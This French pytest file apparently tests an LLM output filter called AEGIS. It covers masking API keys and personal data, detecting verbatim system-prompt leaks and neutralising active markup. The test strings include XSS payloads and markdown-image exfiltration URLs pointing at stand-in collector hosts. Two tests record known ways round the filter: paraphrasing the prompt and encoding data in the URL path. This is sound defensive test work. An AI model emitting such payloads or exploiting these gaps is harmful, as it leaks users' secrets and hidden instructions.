"""
Filtre de sortie : le seul endroit où AEGIS modifie ce que l'utilisateur reçoit.

Les tests les plus importants de ce fichier ne portent pas sur la détection —
ils portent sur ce que le filtre **ne doit pas casser**. Trois d'entre eux
figent des faux positifs qui ont réellement existé et que la mesure a trouvés :
un extrait de code JavaScript, une phrase où « data » précède un deux-points, et
une image de documentation.
"""
from __future__ import annotations

import pytest

from aegis_core.output_guard import (
    MARQUEUR,
    OutputGuard,
    empreintes,
)
from aegis_core.pii_detector import PiiDetector, luhn_valide

PROMPT_SYSTEME = (
    "Tu es SupportAgent, un assistant de support client. Tu reçois la question "
    "d'un client ainsi qu'un document de contexte potentiellement utile."
)


@pytest.fixture
def garde() -> OutputGuard:
    return OutputGuard(hidden_context=(PROMPT_SYSTEME,))


# -- LLM02 : ce qui ne doit pas sortir --------------------------------------


def test_une_cle_d_api_est_masquee(garde):
    resultat = garde.scan("La clé est sk-abcdefghijklmnopqrstuvwxyz012345, note-la.")
    assert MARQUEUR in resultat.text
    assert "sk-abcdefghijklmnopqrstuvwxyz012345" not in resultat.text
    assert resultat.secrets_masques == ("CLE_API",)
    assert resultat.modified


def test_un_telephone_est_signale_mais_pas_masque(garde):
    """Le compromis central du lot, et il se défend.

    Dans une réponse, un numéro est le plus souvent celui que l'utilisateur a
    fourni ou celui du service qu'il demandait. Masquer « joignable au
    01 23 45 67 89 » ne protège personne et casse la réponse.
    """
    resultat = garde.scan("Notre service est joignable au 01 23 45 67 89.")
    assert resultat.text == "Notre service est joignable au 01 23 45 67 89."
    assert not resultat.modified
    assert resultat.donnees_personnelles == ("TELEPHONE",)
    assert resultat.flagged  # vu et journalisé, malgré tout


def test_le_masquage_des_donnees_personnelles_est_activable(garde):
    strict = OutputGuard(mask_personal_data=True)
    resultat = strict.scan("Écrivez à contact@exemple.fr.")
    assert MARQUEUR in resultat.text
    assert resultat.modified


def test_le_filtre_de_sortie_partage_les_validateurs_du_detecteur_d_entree():
    """Deux composants qui appliquent « la même règle » avec des résultats
    différents sont un bug en attente.

    Le contrôle de Luhn a été ajouté au détecteur d'entrée ; s'il n'était pas
    appliqué ici, le filtre de sortie continuerait à signaler un numéro de
    dossier que `PiiDetector` a cessé de masquer.
    """
    texte = "Votre référence est REF-2026-000418291."
    assert PiiDetector().scan(texte).redacted is False
    assert OutputGuard().scan(texte).flagged is False


# -- LLM08 : ce qui devait rester caché -------------------------------------


def test_la_restitution_du_prompt_systeme_est_detectee(garde):
    resultat = garde.scan(
        "Bien sûr : Tu es SupportAgent, un assistant de support client. "
        "Tu reçois la question d'un client ainsi qu'un document de contexte."
    )
    assert resultat.contexte_restitue
    assert "supportagent" in resultat.contexte_restitue[0]


def test_les_fragments_restitues_sont_fusionnes_en_passages(garde):
    """L'opérateur doit voir CE QUI a fuité, pas la mécanique de détection.

    Un passage de vingt mots produit treize empreintes qui se chevauchent ;
    en afficher treize fragments quasi identiques rendrait le signal illisible.
    """
    resultat = garde.scan(
        "Voici : Tu es SupportAgent, un assistant de support client. "
        "Tu reçois la question d'un client ainsi qu'un document de contexte."
    )
    assert len(resultat.contexte_restitue) <= 2
    assert len(resultat.contexte_restitue[0].split()) > 8


def test_une_reponse_normale_ne_declenche_pas_le_contexte(garde):
    resultat = garde.scan("Je suis l'assistant du support, comment puis-je aider ?")
    assert resultat.contexte_restitue == ()


def test_la_paraphrase_echappe_au_controle(garde):
    """Limite assumée, figée pour qu'elle ne soit pas oubliée.

    Le jour où quelqu'un annoncera « AEGIS empêche la fuite du prompt système »,
    ce test rappellera ce que « empêche » veut dire ici : la restitution mot
    pour mot, pas le résumé.
    """
    resultat = garde.scan(
        "En résumé, on m'a demandé d'aider les clients du support en m'appuyant "
        "sur les documents qu'on me donne."
    )
    assert resultat.contexte_restitue == ()


def test_sans_contexte_declare_rien_n_est_cherche():
    nu = OutputGuard()
    assert nu.scan(PROMPT_SYSTEME).contexte_restitue == ()


def test_un_contexte_plus_court_que_l_empreinte_ne_produit_rien():
    """Fabriquer une empreinte plus courte ferait monter les faux positifs sans
    prévenir : mieux vaut ne rien affirmer."""
    court = OutputGuard(hidden_context=("secret interne",))
    assert empreintes("secret interne") == set()
    assert court.scan("Le secret interne est là.").contexte_restitue == ()


# -- LLM10 : ce qui ne doit pas s'exécuter ----------------------------------


@pytest.mark.parametrize(
    "texte",
    [
        "<script>fetch('https://x.example')</script>",
        '<iframe src="https://x.example"></iframe>',
        '<a href="javascript:fetch(1)">clic</a>',
        '<img src=x onerror="fetch(1)">',
        "![](https://collecte.example/p?d=secret)",
    ],
)
def test_le_balisage_actif_est_neutralise(garde, texte):
    resultat = garde.scan(f"Réponse. {texte}")
    assert resultat.modified
    assert resultat.balisage_neutralise


# -- les faux positifs trouvés par la mesure, figés -------------------------


def test_un_extrait_de_code_javascript_n_est_pas_touche(garde):
    """Faux positif réel : la première version balayait tout le texte à la
    recherche de `on...=`, et neutralisait un gestionnaire cité en exemple.
    Hors d'une balise, un gestionnaire d'événement est du texte."""
    texte = "Assignez la fonction : bouton.onclick = validerFormulaire ; sans parenthèses."
    assert garde.scan(texte).text == texte


def test_le_mot_data_suivi_de_deux_points_n_est_pas_une_url(garde):
    """Faux positif réel : `data\\s*:` neutralisait « Le fichier data: 3 colonnes »."""
    texte = "Le fichier data: 3 colonnes, 1 200 lignes, encodage UTF-8."
    assert garde.scan(texte).text == texte


def test_une_image_de_documentation_reste_affichee(garde):
    """Faux positif réel : neutraliser TOUTES les images distantes cassait une
    réponse légitime sur six. Sans liste d'hôtes autorisés, on ne neutralise que
    les URL porteuses de données."""
    texte = "Le schéma est ici : ![parcours](https://docs.exemple.fr/img/retour.png)"
    assert garde.scan(texte).text == texte


def test_une_image_porteuse_de_donnees_est_neutralisee(garde):
    resultat = garde.scan("Fini. ![](https://collecte.example/p?d=secret)")
    assert "collecte.example" not in resultat.text


def test_la_liste_d_hotes_autorises_prime_sur_l_heuristique():
    strict = OutputGuard(allowed_image_hosts=("docs.exemple.fr",))
    interne = strict.scan("![x](https://docs.exemple.fr/a.png?v=2)")
    externe = strict.scan("![x](https://autre.example/a.png)")
    assert interne.text.count("docs.exemple.fr") == 1
    assert "autre.example" not in externe.text


def test_l_exfiltration_par_le_chemin_echappe_a_l_heuristique(garde):
    """Limite explicite de l'heuristique sans liste d'hôtes.

    Un attaquant qui encode sa charge dans le CHEMIN plutôt que dans la requête
    passe. La correction robuste est `allowed_image_hosts` ; ce test existe pour
    que personne ne croie l'heuristique suffisante.
    """
    resultat = garde.scan("![](https://collecte.example/exfil/le-secret-ici.png)")
    assert not resultat.balisage_neutralise


# -- Luhn --------------------------------------------------------------------


def test_luhn_accepte_un_numero_valide_et_refuse_le_reste():
    assert luhn_valide("4539148803436467")
    assert not luhn_valide("4539148803436468")
    assert not luhn_valide("2026000418291")
    assert not luhn_valide("123")


def test_le_marqueur_ne_colle_plus_au_mot_suivant():
    """Le motif se terminait sur un séparateur, qu'il avalait."""
    resultat = PiiDetector().scan("carte 4539 1488 0343 6467 expire bientôt")
    assert "] expire" in resultat.redacted_text


# -- intégration : le contrat de `on_response` ------------------------------


def test_on_response_retourne_le_texte_a_rendre():
    from aegis_core.config import AegisConfig
    from aegis_core.middleware import AegisGuard

    garde = AegisGuard(config=AegisConfig(hidden_context=(PROMPT_SYSTEME,)))
    rendu = garde.on_response(
        "Clé : sk-abcdefghijklmnopqrstuvwxyz012345 [source: aucune]", [], {}
    )
    assert isinstance(rendu, str)
    assert MARQUEUR in rendu


def test_un_hook_de_l_ancien_contrat_ne_casse_pas_la_reponse():
    """Le contrat de `on_response` a changé : il retourne désormais le texte.

    Une intégration tierce écrite pour l'ancien contrat retourne `None`. Livrer
    la chaîne « None » à un utilisateur parce qu'un hook n'a pas été mis à jour
    serait une panne bien pire que l'absence de filtrage.
    """
    from victim.agent import _rendu

    assert _rendu(None, "réponse d'origine") == "réponse d'origine"
    assert _rendu(42, "réponse d'origine") == "réponse d'origine"
    assert _rendu("filtrée", "réponse d'origine") == "filtrée"


def test_le_scan_de_sortie_est_journalise():
    from aegis_core.config import AegisConfig
    from aegis_core.middleware import AegisGuard

    garde = AegisGuard(config=AegisConfig(hidden_context=(PROMPT_SYSTEME,)))
    garde.on_response("Clé sk-abcdefghijklmnopqrstuvwxyz012345 [source: aucune]", [], {})
    types = [e.event["type"] for e in garde.audit_log.all_entries()]
    assert "output_scan" in types


def test_une_reponse_propre_n_est_pas_journalisee_en_sortie():
    """Journaliser chaque réponse noierait le signal : le journal doit porter ce
    qui est arrivé, pas ce qui ne s'est pas produit."""
    from aegis_core.middleware import AegisGuard

    garde = AegisGuard()
    garde.on_response("Tout va bien. [source: aucune]", [], {})
    types = [e.event["type"] for e in garde.audit_log.all_entries()]
    assert "output_scan" not in types
